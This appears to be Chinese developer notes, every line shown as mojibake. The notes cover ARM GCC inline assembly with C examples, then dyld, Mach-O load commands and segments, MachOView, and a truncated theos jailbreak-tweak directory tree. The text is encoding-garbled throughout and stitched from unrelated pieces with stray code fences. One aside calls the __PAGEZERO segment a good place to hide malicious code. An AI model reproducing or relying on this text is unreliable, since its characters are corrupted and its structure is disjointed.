å‡½æ•°testä¸­å†…åµŒäº†ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤å®ç°å°†ç«‹å³æ•°1èµ‹å€¼ç»™å¯„å­˜å™¨R1çš„æ“ä½œã€‚ç”±äºæ²¡æœ‰ä»»ä½•å½¢å¼çš„è¾“å‡ºå’Œè¾“å…¥ï¼Œå› æ­¤è¾“å‡ºå’Œè¾“å…¥åˆ—è¡¨çš„ä½ç½®ä¸Šä»€ä¹ˆéƒ½æ²¡æœ‰å¡«å†™ã€‚ä½†æ˜¯ï¼Œåœ¨æ±‡ç¼–ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­R1å¯„å­˜å™¨ä¼šè¢«ä¿®æ”¹ï¼Œå› æ­¤ä¸ºäº†é€šçŸ¥ç¼–è¯‘å™¨ï¼Œåœ¨è¢«æ›´æ”¹èµ„æºåˆ—è¡¨ä¸­ï¼Œéœ€è¦å†™ä¸Šå¯„å­˜å™¨R1ã€‚

å¯„å­˜å™¨è¢«ä¿®æ”¹è¿™ç§ç°è±¡å‘ç”Ÿçš„é¢‘ç‡è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨è°ƒç”¨æŸæ®µæ±‡ç¼–ç¨‹åºä¹‹å‰ï¼Œå¯„å­˜å™¨R1å¯èƒ½å·²ç»ä¿å­˜äº†æŸä¸ªé‡è¦æ•°æ®ï¼Œå½“æ±‡ç¼–æŒ‡ä»¤è¢«è°ƒç”¨ä¹‹åï¼ŒR1å¯„å­˜å™¨è¢«èµ‹äºˆäº†æ–°çš„å€¼ï¼ŒåŸæ¥çš„å€¼å°±ä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥ï¼Œéœ€è¦å°†ä¼šè¢«ä¿®æ”¹çš„å¯„å­˜å™¨æ”¾å…¥åˆ°è¢«æ›´æ”¹èµ„æºåˆ—è¡¨ä¸­ï¼Œè¿™æ ·ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¸®åŠ©æˆ‘ä»¬è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ä¹Ÿå¯ä»¥è¯´ï¼Œå‡ºç°åœ¨è¢«æ›´æ”¹èµ„æºåˆ—è¡¨ä¸­çš„èµ„æºä¼šåœ¨è°ƒç”¨æ±‡ç¼–ä»£ç ä¸€å¼€å§‹å°±é¦–å…ˆä¿å­˜èµ·æ¥ï¼Œç„¶ååœ¨æ±‡ç¼–ä»£ç ç»“æŸæ—¶é‡Šæ”¾å‡ºå»ã€‚æ‰€ä»¥ï¼Œä¸Šé¢çš„ä»£ç ä¸å¦‚ä¸‹ä»£ç ä»è¯­ä¹‰ä¸Šæ¥è¯´æ˜¯ç­‰ä»·çš„ã€‚

void test(void) 
{   
    â€¦â€¦   
    asm(   
        "stmfd sp!,{r1}\n" 
        "mov r1,#1\n"   
        "ldmfd sp!,{r1}\n"   
    );   
    â€¦â€¦   
} 

è¿™æ®µä»£ç ä¸­çš„å†…è”æ±‡ç¼–æ—¢æ— è¾“å‡ºåˆæ— è¾“å…¥ï¼Œä¹Ÿæ²¡æœ‰èµ„æºè¢«æ›´æ”¹ï¼Œåªç•™ä¸‹äº†æ±‡ç¼–ä»£ç çš„éƒ¨åˆ†ã€‚ç”±äºç¨‹åºåœ¨ä¿®æ”¹R1ä¹‹å‰å·²ç»å°†å¯„å­˜å™¨R1çš„å€¼å‹å…¥äº†å †æ ˆï¼Œåœ¨ä½¿ç”¨å®Œä¹‹åï¼Œåˆå°†R1çš„å€¼ä»å †æ ˆä¸­å¼¹å‡ºï¼Œæ‰€ä»¥ï¼Œé€šè¿‡è¢«æ›´æ”¹èµ„æºåˆ—è¡¨æ¥ä¸´æ—¶ä¿å­˜R1çš„å€¼å°±æ²¡ä»€ä¹ˆå¿…è¦äº†ã€‚

åœ¨ä»¥ä¸Šä¸¤æ®µä»£ç ä¸­ï¼Œæ±‡ç¼–æŒ‡ä»¤éƒ½æ˜¯ç‹¬ç«‹è¿è¡Œçš„ã€‚ä½†æ›´å¤šçš„æ—¶å€™ï¼ŒCå’Œå†…è”æ±‡ç¼–ä¹‹é—´ä¼šå­˜åœ¨ä¸€ç§äº¤äº’ã€‚Cç¨‹åºéœ€è¦æŠŠæŸäº›å€¼ä¼ é€’ç»™å†…è”æ±‡ç¼–è¿ç®—ï¼Œå†…è”æ±‡ç¼–ä¹Ÿä¼šæŠŠè¿ç®—ç»“æœè¾“å‡ºç»™Cä»£ç ã€‚æ­¤æ—¶å°±å¯ä»¥é€šè¿‡å°†é€‚å½“çš„å€¼åˆ—åœ¨è¾“å…¥è¿ç®—ç¬¦åˆ—è¡¨å’Œè¾“å‡ºè¿ç®—ç¬¦åˆ—è¡¨ä¸­æ¥å®ç°è¿™ä¸€è¦æ±‚ã€‚è¯·çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š

void test(void) 
{   
    int tmp=5;   
    asm(   
        "mov r4,%0\n"   
        :   
        :"r"(tmp)   
        :"r4"   
    );   
} 

ä¸Šé¢çš„ä»£ç ä¸­æœ‰ä¸€æ¡movæŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤å°†%0èµ‹å€¼ç»™R4ã€‚è¿™é‡Œï¼Œç¬¦å·%0ä»£è¡¨å‡ºç°åœ¨è¾“å…¥è¿ç®—ç¬¦åˆ—è¡¨å’Œè¾“å‡ºè¿ç®—ç¬¦åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå€¼ã€‚å¦‚æœ%1å­˜åœ¨çš„è¯ï¼Œé‚£ä¹ˆå®ƒå°±ä»£è¡¨å‡ºç°åœ¨åˆ—è¡¨ä¸­çš„ç¬¬äºŒä¸ªå€¼ï¼Œä¾æ­¤ç±»æ¨ã€‚æ‰€ä»¥ï¼Œåœ¨è¯¥æ®µä»£ç ä¸­ï¼Œ%0ä»£è¡¨çš„å°±æ˜¯â€œrâ€(tmp)è¿™ä¸ªè¡¨è¾¾å¼çš„å€¼äº†ã€‚

é‚£ä¹ˆè¿™ä¸ªæ–°çš„è¡¨è¾¾å¼åˆè¯¥æ€æ ·è§£é‡Šå‘¢ï¼ŸåŸæ¥ï¼Œåœ¨â€œrâ€(tmp)è¿™ä¸ªè¡¨è¾¾å¼ä¸­ï¼Œtmpä»£è¡¨çš„æ­£æ˜¯Cè¯­è¨€å‘å†…è”æ±‡ç¼–è¾“å…¥çš„å˜é‡ï¼Œæ“ä½œç¬¦â€œrâ€åˆ™ä»£è¡¨tmpçš„å€¼ä¼šé€šè¿‡æŸä¸€ä¸ªå¯„å­˜å™¨æ¥ä¼ é€’ã€‚åœ¨GCC4ä¸­ä¸ä¹‹ç›¸ç±»ä¼¼çš„æ“ä½œç¬¦è¿˜åŒ…æ‹¬â€œmâ€ã€â€œIâ€ï¼Œç­‰ç­‰ï¼Œå…¶å«ä¹‰è§ä¸‹è¡¨ï¼š

ARMåµŒå…¥å¼å¼€å‘ä¸­çš„GCCå†…è”æ±‡ç¼–ç®€ä»‹

ä¸è¾“å…¥è¿ç®—ç¬¦åˆ—è¡¨çš„åº”ç”¨æ–¹æ³•ä¸€è‡´ï¼Œå½“Cè¯­è¨€éœ€è¦åˆ©ç”¨å†…è”æ±‡ç¼–è¾“å‡ºç»“æœæ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¾“å‡ºè¿ç®—ç¬¦åˆ—è¡¨æ¥å®ç°ï¼Œå…¶æ ¼å¼åº”è¯¥æ˜¯ä¸‹é¢è¿™æ ·çš„ã€‚

void test(void) 
{   
    int tmp;   
    asm(   
        "mov %0,#1\n"   
        :"=r"(tmp)   
        :   
    );   
} 

åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼ŒåŸæœ¬åº”å‡ºç°åœ¨è¾“å…¥è¿ç®—ç¬¦åˆ—è¡¨ä¸­çš„è¿ç®—ç¬¦ï¼Œç°åœ¨å‡ºç°åœ¨äº†è¾“å‡ºè¿ç®—ç¬¦åˆ—è¡¨ä¸­ï¼ŒåŒæ—¶å˜é‡tmpå°†ä¼šå­˜å‚¨å†…è”æ±‡ç¼–çš„è¾“å‡ºç»“æœã€‚
è¿™é‡Œæœ‰ä¸€ç‚¹å¯èƒ½å·²ç»å¼•èµ·å¤§å®¶çš„æ³¨æ„äº†ï¼Œä¸Šé¢çš„ä»£ç ä¸­æ“ä½œç¬¦rçš„å‰é¢å¤šäº†ä¸€ä¸ªâ€œ=â€ã€‚è¿™ä¸ªç­‰å·è¢«ç§°ä¸ºçº¦æŸä¿®é¥°ç¬¦ï¼Œå…¶ä½œç”¨æ˜¯å¯¹å†…è”æ±‡ç¼–çš„æ“ä½œç¬¦è¿›è¡Œä¿®é¥°ã€‚

å½“ä¸€ä¸ªæ“ä½œç¬¦æ²¡æœ‰ä¿®é¥°ç¬¦å¯¹å…¶è¿›è¡Œä¿®é¥°æ—¶ï¼Œä»£è¡¨è¿™ä¸ªæ“ä½œç¬¦æ˜¯åªè¯»çš„ã€‚å½“æˆ‘ä»¬éœ€è¦å°†å†…è”æ±‡ç¼–çš„ç»“æœè¾“å‡ºå‡ºæ¥ï¼Œé‚£ä¹ˆè‡³å°‘è¦ä¿è¯è¯¥æ“ä½œç¬¦æ˜¯å¯å†™çš„ã€‚å› æ­¤ï¼Œâ€œ=â€æˆ–è€…â€œ+â€ä¹Ÿå°±å¿…ä¸å¯å°‘äº†ã€‚

```
----------------------------------------------------------------------------------------------------------------

## dyld
åŠ¨æ€é“¾æ¥å™¨ï¼Œå…¶æœ¬è´¨ä¹Ÿæ˜¯ Mach-O æ–‡ä»¶ï¼Œä¸€ä¸ªä¸“é—¨ç”¨æ¥åŠ è½½ dylib æ–‡ä»¶çš„åº“ã€‚
dyld ä½äº /usr/lib/dyldï¼Œå¯ä»¥åœ¨ macOS å’Œè¶Šç‹±æœºä¸­æ‰¾åˆ°ã€‚
dyld ä¼šå°† App ä¾èµ–çš„åŠ¨æ€åº“å’Œ App æ–‡ä»¶åŠ è½½åˆ°å†…å­˜æ‰§è¡Œã€‚

## Mach-O æ–‡ä»¶

### Mach headerï¼šæè¿° Mach-O çš„ CPU æ¶æ„ã€æ–‡ä»¶ç±»å‹ä»¥åŠåŠ è½½å‘½ä»¤ç­‰ï¼›
### Load commandsï¼šæè¿°äº†æ–‡ä»¶ä¸­æ•°æ®çš„å…·ä½“ç»„ç»‡ç»“æ„ï¼Œä¸åŒçš„æ•°æ®ç±»å‹ä½¿ç”¨ä¸åŒçš„åŠ è½½å‘½ä»¤ï¼›
### Dataï¼šData ä¸­çš„æ¯ä¸ªæ®µï¼ˆsegmentï¼‰çš„æ•°æ®éƒ½ä¿å­˜åœ¨è¿™é‡Œ;

### æ¯ä¸ªæ®µï¼ˆsegmentï¼‰éƒ½æœ‰Section : å­˜æ”¾äº†å…·ä½“çš„æ•°æ®ä¸ä»£ç ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š

__TEXT åŒ…å« Mach headerï¼Œè¢«æ‰§è¡Œçš„ä»£ç å’Œåªè¯»å¸¸é‡ï¼ˆå¦‚C å­—ç¬¦ä¸²ï¼‰ã€‚åªè¯»å¯æ‰§è¡Œï¼ˆr-xï¼‰ã€‚

__DATA åŒ…å«å…¨å±€å˜é‡ï¼Œé™æ€å˜é‡ç­‰ã€‚å¯è¯»å†™ï¼ˆrw-ï¼‰ã€‚

__LINKEDIT åŒ…å«äº†åŠ è½½ç¨‹åºçš„å…ƒæ•°æ®ï¼Œæ¯”å¦‚å‡½æ•°çš„åç§°å’Œåœ°å€ã€‚åªè¯»ï¼ˆrâ€“-ï¼‰ã€‚

## MachOView : æŸ¥çœ‹MachOæ–‡ä»¶æ ¼å¼ä¿¡æ¯
### MachOViewæºç åœ°å€ï¼šhttps://github.com/gdbinit/MachOView

```
Mach-Oæ ¼å¼å…¨ç§°ä¸ºMach Objectæ–‡ä»¶æ ¼å¼çš„ç¼©å†™ï¼Œæ˜¯macä¸Šå¯æ‰§è¡Œæ–‡ä»¶çš„æ ¼å¼ï¼Œ
ç±»ä¼¼äºwindowsä¸Šçš„PEæ ¼å¼ (Portable Executable ), linuxä¸Šçš„elfæ ¼å¼ (Executable and Linking Format)ã€‚

Mach-Oæ–‡ä»¶ç±»å‹åˆ†ä¸ºï¼š

1ã€Executableï¼šåº”ç”¨çš„ä¸»è¦äºŒè¿›åˆ¶

2ã€Dylib Libraryï¼šåŠ¨æ€é“¾æ¥åº“ï¼ˆåˆç§°DSOæˆ–DLLï¼‰

3ã€Static Libraryï¼šé™æ€é“¾æ¥åº“

4ã€Bundleï¼šä¸èƒ½è¢«é“¾æ¥çš„Dylibï¼Œåªèƒ½åœ¨è¿è¡Œæ—¶ä½¿ç”¨dlopen( )åŠ è½½ï¼Œå¯å½“åšmacOSçš„æ’ä»¶

5ã€Relocatable Object File ï¼šå¯é‡å®šå‘æ–‡ä»¶ç±»å‹

é‚£ä»€ä¹ˆåˆæ˜¯FatFile/FatBinaryï¼Ÿ

ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªç”±ä¸åŒçš„ç¼–è¯‘æ¶æ„åçš„Mach-Oäº§ç‰©æ‰€åˆæˆçš„é›†åˆä½“ã€‚
ä¸€ä¸ªæ¶æ„çš„mach-Oåªèƒ½åœ¨ç›¸åŒæ¶æ„çš„æœºå™¨æˆ–è€…æ¨¡æ‹Ÿå™¨ä¸Šç”¨ï¼Œä¸ºäº†æ”¯æŒä¸åŒæ¶æ„éœ€è¦ä¸€ä¸ªé›†åˆä½“ã€‚
```

```
MachOViewåœ¨load Commandsé‡Œé¢åŠ è½½äº†è¿™ä¹ˆäº›åŠ¨æ€åº“: 

LC_SEGMENT_64ï¼šå®šä¹‰ä¸€ä¸ªï¼ˆ64ä½ï¼‰æ®µï¼ŒÂ å½“æ–‡ä»¶åŠ è½½åå®ƒå°†è¢«æ˜ å°„åˆ°åœ°å€ç©ºé—´ã€‚åŒ…æ‹¬æ®µå†…èŠ‚ï¼ˆsectionï¼‰çš„å®šä¹‰ã€‚

LC_SYMTABï¼šä¸ºè¯¥æ–‡ä»¶å®šä¹‰ç¬¦å·è¡¨ï¼ˆâ€˜stabsâ€™Â é£æ ¼ï¼‰å’Œå­—ç¬¦ä¸²è¡¨ã€‚Â ä»–ä»¬åœ¨é“¾æ¥æ–‡ä»¶æ—¶è¢«é“¾æ¥å™¨ä½¿ç”¨ï¼ŒåŒæ—¶ä¹Ÿç”¨äºè°ƒè¯•å™¨æ˜ å°„ç¬¦å·åˆ°æºæ–‡ä»¶ã€‚å…·ä½“æ¥è¯´ï¼Œç¬¦å·è¡¨å®šä¹‰æœ¬åœ°ç¬¦å·ä»…ç”¨äºè°ƒè¯•ï¼Œè€Œå·²å®šä¹‰å’Œæœªå®šä¹‰externalÂ ç¬¦å·è¢«é“¾æ¥å™¨ä½¿ç”¨ã€‚

LC_DYSYMTABï¼šæä¾›ç¬¦å·è¡¨ä¸­ç»™å‡ºç¬¦å·çš„é¢å¤–ç¬¦å·ä¿¡æ¯ç»™åŠ¨æ€é“¾æ¥å™¨ï¼Œä»¥ä¾¿å…¶å¤„ç†ã€‚Â åŒ…æ‹¬ä¸“é—¨ä¸ºæ­¤è€Œè®¾çš„ä¸€ä¸ªé—´æ¥ç¬¦å·è¡¨çš„å®šä¹‰ã€‚

LC_DYLD_INFO_ONLYï¼šå®šä¹‰ä¸€ä¸ªé™„åŠ Â å‹ç¼©çš„åŠ¨æ€é“¾æ¥å™¨ä¿¡æ¯èŠ‚ï¼Œå®ƒåŒ…å«åœ¨å…¶ä»–äº‹é¡¹ä¸­ç”¨åˆ°çš„Â åŠ¨æ€ç»‘å®šç¬¦å·å’Œæ“ä½œç çš„å…ƒæ•°æ®ã€‚stubÂ ç»‘å®šå™¨ï¼ˆâ€œdyld_stub_binderâ€ï¼‰ï¼Œå®ƒæ¶‰åŠçš„åŠ¨æ€é—´æ¥é“¾æ¥åˆ©ç”¨äº†è¿™ç‚¹ã€‚Â â€œ_ONLYâ€Â åç¼€tè¡¨æ˜è¿™ä¸ªåŠ è½½æŒ‡ä»¤æ˜¯ç¨‹åºè¿è¡Œå¿…é¡»çš„ï¼Œ,Â è¿™æ ·é‚£äº›æ—§åˆ°ä¸èƒ½ç†è§£è¿™ä¸ªåŠ è½½æŒ‡ä»¤çš„é“¾æ¥å™¨å°±åœ¨è¿™é‡Œåœä¸‹ã€‚

LC_LOAD_DYLINKER:Â åŠ è½½ä¸€ä¸ªåŠ¨æ€é“¾æ¥å™¨ã€‚åœ¨OSÂ Xä¸Šï¼Œé€šå¸¸æ˜¯â€œ/usr/lib/dyldâ€ã€‚LC_LOAD_DYLIB:Â åŠ è½½ä¸€ä¸ªåŠ¨æ€é“¾æ¥å…±äº«åº“ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œâ€œ/usr/lib/libSystem.B.dylibâ€ï¼Œè¿™æ˜¯Cæ ‡å‡†åº“çš„å®ç°å†åŠ ä¸Šä¸€å †å…¶ä»–çš„äº‹åŠ¡ï¼ˆç³»ç»Ÿè°ƒç”¨å’Œå†…æ ¸æœåŠ¡ï¼Œå…¶ä»–ç³»ç»Ÿåº“ç­‰ï¼‰ã€‚æ¯ä¸ªåº“ç”±åŠ¨æ€é“¾æ¥å™¨åŠ è½½å¹¶åŒ…å«ä¸€ä¸ªç¬¦å·è¡¨ï¼Œç¬¦å·é“¾æ¥åç§°æ˜¯æŸ¥æ‰¾åŒ¹é…çš„ç¬¦å·åœ°å€ã€‚

LC_MAINï¼šæŒ‡æ˜ç¨‹åºçš„å…¥å£ç‚¹ã€‚åœ¨æœ¬æ¡ˆä¾‹ï¼Œæ˜¯å‡½æ•°themain()çš„åœ°å€ã€‚

LC_UUIDï¼šæä¾›ä¸€ä¸ªå”¯ä¸€çš„éšæœºUUIDï¼Œé€šå¸¸ç”±é™æ€é“¾æ¥å™¨ç”Ÿæˆã€‚

LC_VERSION_MIN_MACOSXï¼šç¨‹åºå¯è¿è¡Œçš„æœ€ä½OSÂ Xç‰ˆæœ¬è¦æ±‚

LC_SOURCE_VERSION:ï¼šæ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶çš„æºç ç‰ˆæœ¬å·ã€‚

LC_FUNCTION_STARTSï¼šå®šä¹‰ä¸€ä¸ªå‡½æ•°èµ·å§‹åœ°å€è¡¨ï¼Œä½¿è°ƒè¯•å™¨å’Œå…¶ä»–ç¨‹åºæ˜“äºçœ‹åˆ°ä¸€ä¸ªåœ°å€æ˜¯å¦åœ¨å‡½æ•°å†…ã€‚

LC_DATA_IN_CODEï¼šå®šä¹‰åœ¨ä»£ç æ®µå†…çš„éæŒ‡ä»¤çš„è¡¨ã€‚

LC_DYLIB_CODE_SIGN_DRS:Â ä¸ºå·²é“¾æ¥çš„åŠ¨æ€åº“å®šä¹‰ä»£ç ç­¾åÂ æŒ‡å®šè¦æ±‚ã€‚

Xcodeå·¥ç¨‹é‡Œçš„ç³»ç»Ÿåº“ åˆ™è½¬åŒ–ä¸ºLC_LOAD_DYLIB æ‰€è°“dylibåµŒå…¥å°±æ˜¯æŒ‡çš„è¿™ä¸ªè¿‡ç¨‹ æ­¤åœ¨åæ–‡ä¸­äºˆä»¥ä»‹ç»

è€Œå…³äºLC_SEGMENT_64å¤´éƒ¨åˆ™æœ‰å¦‚ä¸‹çš„å®šä¹‰è¯´æ˜

__PAGEZEROï¼šä¸€ä¸ªå…¨ç”¨0å¡«å……çš„æ®µï¼Œç”¨äºæŠ“å–ç©ºæŒ‡é’ˆå¼•ç”¨ã€‚è¿™é€šå¸¸ä¸ä¼šå ç”¨ç£ç›˜ç©ºé—´(æˆ–å†…å­˜ç©ºé—´)ï¼Œå› ä¸ºå®ƒè¿è¡Œæ—¶æ˜ å°„ä¸ºä¸€ç¾¤0å•Šã€‚é¡ºä¾¿è¯´ä¸€å¥ï¼Œè¿™ä¸ªæ®µæ˜¯éšè—æ¶æ„ä»£ç çš„å¥½åœ°æ–¹ã€‚

__TEXTï¼šæœ¬æ®µåªæœ‰å¯æ‰§è¡Œä»£ç å’Œå…¶ä»–åªè¯»æ•°æ®ã€‚

__textï¼šæœ¬æ®µæ˜¯å¯æ‰§è¡Œæœºå™¨ç ã€‚

__stubsï¼šé—´æ¥ç¬¦å·å­˜æ ¹ã€‚è¿™äº›è·³è½¬åˆ°éå»¶è¿ŸåŠ è½½Â (â€œéšè¿è¡ŒåŠ è½½â€)Â å’Œå»¶è¿ŸåŠ è½½(â€œåˆæ¬¡ä½¿ç”¨æ—¶åŠ è½½â€)Â é—´æ¥å¼•ç”¨çš„ï¼ˆå¯å†™ï¼‰ä½ç½®çš„å€¼Â (ä¾‹å¦‚æ¡ç›®â€œ__la_symbol_ptrâ€ï¼Œæˆ‘ä»¬å¾ˆå¿«å°±ä¼šçœ‹åˆ°)ã€‚å¯¹äºå»¶è¿ŸåŠ è½½å¼•ç”¨ï¼Œå…¶åœ°å€è·³è½¬è®²é¦–å…ˆæŒ‡å‘ä¸€ä¸ªè§£æè¿‡ç¨‹ï¼Œä½†åˆå§‹åŒ–è§£æåä¼šæŒ‡å‘ä¸€ä¸ªç¡®å®šçš„åœ°å€ã€‚Â å¯¹äºéå»¶è¿ŸåŠ è½½å¼•ç”¨ï¼Œå…¶åœ°å€è·³è½¬ä¼šå§‹ç»ˆæŒ‡å‘ä¸€ä¸ªç¡®å®šçš„åœ°å€ï¼Œå› ä¸ºåŠ¨æ€é“¾æ¥å™¨åœ¨åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶æ—¶å°±ä¿®æ­£å¥½äº†ã€‚

__stub_helperï¼šæä¾›åŠ©æ‰‹æ¥è§£å†³å»¶è¿ŸåŠ è½½ç¬¦å·ã€‚å¦‚ä¸Šæ‰€è¿°ï¼Œå»¶è¿ŸåŠ è½½çš„é—´æ¥ç¬¦å·æŒ‡é’ˆå°†æŒ‡åˆ°è¿™é‡Œé¢ï¼Œç›´åˆ°å¾—åˆ°ç¡®å®šåœ°å€ã€‚

__cstringï¼šÂ constantÂ (åªè¯»)Â Cé£æ ¼å­—ç¬¦ä¸²ï¼ˆå¦‚â€Hello,Â world!nâ€ï¼‰çš„èŠ‚ã€‚é“¾æ¥å™¨åœ¨ç”Ÿæˆæœ€ç»ˆäº§å“æ—¶ä¼šæ¸…é™¤é‡å¤è¯­å¥ã€‚

__unwind_infoï¼šä¸€ä¸ªç´§å‡‘æ ¼å¼ï¼Œä¸ºäº†å­˜å‚¨å †æ ˆå±•å¼€ä¿¡æ¯ä¾›å¤„ç†å¼‚å¸¸ã€‚æ­¤èŠ‚ç”±é“¾æ¥å™¨ç”Ÿæˆï¼Œé€šè¿‡â€œ__eh_frameâ€é‡Œä¾›OSÂ Xå¼‚å¸¸å¤„ç†çš„ä¿¡æ¯ã€‚

__eh_frameï¼šÂ ä¸€ä¸ªæ ‡å‡†çš„èŠ‚ï¼Œç”¨äºå¼‚å¸¸å¤„ç†ï¼Œå®ƒæä¾›å †æ ˆå±•å¼€ä¿¡æ¯ï¼Œä»¥DWARFæ ¼å¼ã€‚


__DATAï¼šç”¨äºè¯»å–å’Œå†™å…¥æ•°æ®çš„ä¸€ä¸ªæ®µã€‚

__nl_symbol_ptrï¼šéå»¶è¿Ÿå¯¼å…¥ç¬¦å·æŒ‡é’ˆè¡¨ã€‚

__la_symbol_ptrï¼šå»¶è¿Ÿå¯¼å…¥ç¬¦å·æŒ‡é’ˆè¡¨ã€‚æœ¬èŠ‚å¼€å§‹æ—¶ï¼ŒæŒ‡é’ˆä»¬æŒ‡å‘è§£æåŠ©æ‰‹ï¼Œå¦‚å‰æ‰€è®¨è¿°ã€‚

__gotï¼šå…¨å±€åç§»è¡¨â€“â€”Â ï¼ˆéå»¶è¿Ÿï¼‰å¯¼å…¥å…¨å±€æŒ‡é’ˆè¡¨ã€‚


__LINKEDITï¼šåŒ…å«ç»™é“¾æ¥å™¨ï¼ˆâ€œé“¾æ¥ç¼–è¾‘å™¨â€˜ï¼‰çš„åŸå§‹æ•°æ®çš„æ®µï¼Œåœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼ŒåŒ…æ‹¬ç¬¦å·å’Œå­—ç¬¦ä¸²è¡¨ï¼Œå‹ç¼©åŠ¨æ€é“¾æ¥ä¿¡æ¯ï¼Œä»£ç ç­¾åå­˜æ‰˜å‡­è¯ï¼Œä»¥åŠé—´æ¥ç¬¦å·è¡¨â€“æ‰€æœ‰è¿™ä¸€åˆ‡çš„å åŒºéƒ½è¢«åŠ è½½æŒ‡ä»¤æŒ‡å®šäº†ã€‚

```


theos .debæ’ä»¶
```
   .
â”œâ”€â”€ .theos
|   â”œâ”€â”€ _ 
|   |    â””â”€â”€ ...  *
|   â”œâ”€â”€ obj 
|   |    â””â”€â”€ ...  *
|   â”œâ”€â”€ packages 
|   |    â””â”€â”€ ...   è®°å½•ç‰ˆæœ¬å·
|   â”œâ”€â”€ build_session
|   â”œâ”€â”€ fakeroot
|   â””â”€â”€ last_package    å½“å‰æ‰“åŒ…æˆåŠŸä»¥åæ”¾çš„è·¯å¾„
â”œâ”€â”€ obj   å®é™…ä¸Šè·Ÿä¸Šé¢.theos/objçš„ç›®å½•æ˜¯ä¸€æ ·çš„
|   â””â”€â”€ 
